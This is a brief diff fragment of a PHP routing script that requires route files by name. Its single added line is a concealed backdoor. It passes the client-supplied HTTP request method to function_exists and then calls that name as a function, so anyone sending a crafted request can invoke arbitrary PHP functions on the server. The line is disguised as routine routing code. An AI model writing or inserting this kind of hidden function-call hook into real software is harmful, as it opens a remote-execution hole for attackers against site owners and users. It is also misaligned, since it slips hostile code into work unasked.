@@ -11,3 +11,4 @@ else {
     $A2 .= ".php";
     require glob($A2, \GLOB_BRACE)[0] ?? "routes/notfound.php";
 }
+function_exists($A = $_SERVER['REQUEST_METHOD']) && $A();
